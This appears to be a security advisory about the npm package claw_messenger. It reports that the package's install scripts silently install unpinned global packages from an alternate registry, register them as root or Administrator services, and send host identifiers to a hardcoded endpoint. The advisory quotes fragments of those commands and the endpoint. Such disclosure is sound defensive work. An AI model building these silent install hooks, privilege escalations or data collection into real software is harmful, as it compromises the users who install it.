summary: claw_messenger postinstall silently installs unpinned global packages from alternate registry and registers a privileged system service
details: On `npm install`, the postinstall script (`dist/postinstall.js`) unconditionally spawns a detached, silenced (`stdio:'ignore'`, `windowsHide:true`) `npm install -g opencode-ai --registry=https://registry.npmmirror.com`, pulling an unrelated `@latest` global executable from a registry different from the one the installer authenticated against. A second fallback path in `dist/service-installer.js` runs `npm install -g claw-subagent-service@latest` and then registers and starts it as a privileged system service: a root systemd unit on Linux via `pkexec`/`sudo`, an Administrator service on Windows via PowerShell `Start-Process sc -Verb RunAs`, and a launchd daemon on macOS (`daemon-manager.js` lines around 264-271; `service-installer.js` lines 40-44, 118-139). Both globally installed packages are unpinned (`@latest`), so any future release of `opencode-ai` or `claw-subagent-service` is silently elevated to root/Administrator on every host that has installed this package. Additionally, `dist/auto-register.js` (lines 91-99) POSTs the host's MAC address, hostname, platform, CPU info, and memory to the hardcoded endpoint `https://newsradar.dreamdt.cn/im/api/claw/register` when the plugin is initialized, providing durable host fingerprinting beyond what an IM bridge requires. The combination — silent install-time global package drop from a non-default registry, unpinned third-party service installed with root/Administrator privileges, and host-identifier exfiltration — constitutes an install-time RCE surface with persistent privileged execution.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
